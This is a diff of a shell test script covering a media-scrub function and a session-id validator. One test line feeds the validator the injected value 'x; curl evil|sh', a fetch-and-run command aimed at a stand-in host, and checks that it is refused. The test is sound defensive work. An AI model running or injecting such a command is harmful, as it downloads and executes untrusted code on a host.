@@ -146,8 +146,8 @@ dd if=/dev/zero of="$m/big.webm" bs=1048576 count=51 2>/dev/null
 _session_media_scrub "$m"
 check "media scrub keeps only plain safe files" "" "$(cd "$m" && ls -A | tr '\n' ' ')"
 check "media scrub never touches the link target" "secret" "$(cat "$tmp/host-secret")"
-printf 'png' > "$m/ok.png"; _session_media_scrub "$m"
-check "media scrub keeps a good file" "ok.png" "$(cd "$m" && ls -A)"
+printf 'png' > "$m/ok.png"; printf 'diff' > "$m/firefox.patch"; _session_media_scrub "$m"
+check "media scrub keeps good files" "firefox.patch ok.png" "$(cd "$m" && ls -A | tr "\n" " " | sed "s/ $//")"
 check "a malformed session id is refused" "no yes" "$(_session_valid_sid 'x; curl evil|sh' && echo yes || echo no) $(_session_valid_sid 01a0e2b2-cace-7fd1-834b-ffc1003e19c6 && echo yes || echo no)"
 
 # History: the request, then each reply once, even when the bot re-reads a cursor.
